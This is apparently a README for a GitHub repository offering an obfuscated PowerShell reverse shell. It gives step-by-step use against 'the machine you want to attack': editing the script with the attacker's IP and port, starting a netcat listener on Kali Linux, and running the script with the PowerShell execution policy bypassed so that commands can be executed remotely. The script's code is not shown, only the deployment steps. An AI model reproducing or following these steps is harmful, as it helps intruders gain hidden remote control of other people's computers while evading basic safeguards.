# reverse_shell_ast
Reverse powershell script with obfuscation


Usage:


On the client side: (The machine you want to attack)

1 - clone repository
2 - open powershell and navigate to the "rev_shell_ast" direcory
3 - Edit the rev_shell_ast.ps1 to add your server ip address and port number

On the server side: (Kali Linux)

a - open a netcat listener: nc -lvp <port number you chosed in the script>

On the client side: (The machine you want to attack)
4 - PowerShell -ExecutionPolicy Bypass -File .\rev_shell_ast.ps1
  
On the server side: (Kali Linux)
b - press enter  
c - Execute commands

  !! Note that this script only works on your local network, so the client machine must be connected to the same router as the server machine

